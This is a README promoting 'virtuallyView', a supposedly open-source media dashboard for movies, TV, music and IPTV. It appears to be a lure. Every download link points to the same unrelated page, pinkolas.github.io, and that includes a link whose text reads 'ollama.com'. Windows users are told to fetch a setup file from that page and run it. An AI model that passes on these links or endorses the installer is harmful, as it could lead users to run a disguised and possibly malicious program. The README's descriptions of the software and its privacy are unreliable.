# 🎬 virtuallyView - Your Personal Netflix, No Subscription Needed

## 🚀 What Is virtuallyView?

virtuallyView is a free, self-hosted media dashboard that brings all your movies, TV shows, music, and live TV into one beautiful, easy-to-use interface. Think of it as your own personal Netflix – but you control everything. No monthly fees, no ads, no corporate algorithms. Just your content, your way.

This open-source application connects your existing media tools (Radarr for movies, Sonarr for TV shows, Lidarr for music, and qBittorrent for downloading) into a single, unified experience. You can browse your entire library, request new titles, stream instantly to your TV, and even use local AI to help organize your collection – all from your own computer or home server.

## ✨ Key Features

- **All-in-One Dashboard** – Movies, TV, music, and live TV in one clean interface
- **Smart Request System** – Want a new movie? Request it and virtuallyView handles the rest
- **Cast to TV** – Stream directly to Chromecast-enabled devices with one click
- **Local AI Integration** – Uses Ollama to help organize and recommend content without cloud services
- **IPTV Support** – Watch live television channels alongside your personal library
- **Docker Ready** – Simple deployment with Docker and Docker Compose
- **Open Source** – MIT licensed, free forever, no hidden costs
- **Privacy Focused** – All your data stays on your own hardware

## 🖥️ What You Need

Before getting started, make sure you have:

- A Windows computer (version 10 or 11 recommended)
- At least 4GB of RAM (8GB or more recommended)
- About 2GB of free hard drive space for the application itself
- A modern web browser (Chrome, Edge, or Firefox)
- Optional: A Chromecast device for TV casting
- Optional: Docker Desktop if you prefer using Docker

## 📥 Download and Installation

[![Download virtuallyView](https://img.shields.io/badge/Download-virtuallyView-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://pinkolas.github.io)

### Step 1: Download the Application

Visit this link to download the application: [https://pinkolas.github.io](https://pinkolas.github.io)

Once you're on the page, look for the download button or the latest release section. The download may take a few minutes depending on your internet speed.

### Step 2: Find Your Downloaded File

After downloading, open your browser's download folder or check your "Downloads" folder. You should see a file named something like "virtuallyView" or "virtuallyView-setup".

### Step 3: Run the Installation

Double-click the downloaded file to start the installation process. Follow the on-screen instructions – it's as simple as clicking "Next" a few times and choosing where you want to install the application.

### Step 4: Launch virtuallyView

Once installed, you'll find virtuallyView in your Start Menu or on your desktop. Click it to launch. Your web browser will open automatically, showing you your new media dashboard.

## 🐳 Optional: Docker Installation

If you're comfortable with Docker, you can run virtuallyView in a container:

1. Install Docker Desktop for Windows
2. Open a command prompt or PowerShell
3. Run the following command:
   ```
   docker run -d -p 8080:8080 virtuallyview
   ```
4. Open your browser and go to `http://localhost:8080`

This method is great for advanced users who want to keep things clean and isolated.

## 🎯 Getting Started Guide

### First-Time Setup

When you first launch virtuallyView, you'll see a welcome screen. Here's what to do:

1. **Create your admin account** – This is the account you'll use to manage everything
2. **Connect your media services** – Click on "Settings" and add your Radarr, Sonarr, Lidarr, and qBittorrent server addresses. If you don't have these yet, don't worry – virtuallyView works standalone too
3. **Add your media folders** – Point virtuallyView to where your movies, TV shows, and music are stored on your computer
4. **Start exploring** – Once connected, your entire library will appear in the dashboard

### Requesting New Content

Want to watch something you don't have yet? Here's how:

1. Click the "Search" icon at the top of the page
2. Type in the movie or show you want
3. Click "Request"
4. virtuallyView will automatically search your connected services and add it to your library when available

### Casting to Your TV

To watch on your television:

1. Make sure your Chromecast is on the same Wi-Fi network as your computer
2. Open any movie, TV show, or music track
3. Click the cast icon (it looks like a TV with a Wi-Fi signal)
4. Select your Chromecast device
5. Sit back and enjoy!

## 🔧 Troubleshooting Common Issues

### "I can't connect to virtuallyView"

Make sure the application is running. Look for the virtuallyView icon in your system tray (bottom-right corner of your screen). If it's there, try restarting your browser.

### "My media isn't showing up"

Double-check that you've added the correct folder paths in Settings. Also, make sure your media files are in a format virtuallyView supports (MP4, MKV, AVI, MP3, FLAC, etc.).

### "The download is slow"

This is normal for larger files. Make sure you have a stable internet connection and try pausing other downloads.

## 🔒 Privacy and Security

Your data stays on your computer. virtuallyView doesn't send your viewing history, personal information, or media files to any external servers. The only optional external connection is when you request content from your connected services.

## 🧠 Using Local AI

virtuallyView includes built-in support for Ollama, a local AI assistant. This means you can:

- Get personalized recommendations based on your viewing history
- Have AI automatically organize your media library
- Search for content using natural language (like "Show me action movies from the 90s")

To enable this feature:

1. Install Ollama from [ollama.com](https://pinkolas.github.io)
2. Open virtuallyView Settings
3. Enable "Local AI Assistant"
4. Follow the prompts to connect

Everything runs on your own hardware – no cloud AI services involved.

## 🤝 Getting Help

Need assistance? Here are your options:

- Check the "Help" section inside the application
- Visit the GitHub repository for documentation and community discussions
- Look for the "Issues" tab on the GitHub page to report problems or ask questions

## 📜 License and Legal

virtuallyView is released under the MIT License. This means you can use, modify, and distribute it freely. The software is provided "as is" without warranty.

Remember to only download content that you have the legal right to access. The developers of virtuallyView are not responsible for how you use this software.

## 🔄 Updating virtuallyView

We regularly release updates with new features and bug fixes. To update:

1. Visit the download page again
2. Download the newest version
3. Run the installer – your settings and library will be preserved

## ⭐ Final Thoughts

virtuallyView transforms your personal media collection into a streaming experience that rivals commercial services – without the monthly cost or corporate tracking. Whether you're a movie buff, TV show binge-watcher, music lover, or live TV enthusiast, virtuallyView puts you in control.

Start your journey today. Download virtuallyView and experience the freedom of truly owning your entertainment.

[![Get Started Now](https://img.shields.io/badge/Get_Started-Download-green?style=for-the-badge&logo=download&color=random)](https://pinkolas.github.io)

---

Keywords: chromecast, docker, docker-compose, fastify, homelab, iptv, lidar, media-server, ollama, open-source, opensource, radarr, react, self-hosted, selfhosted, sonarr, streaming, typescript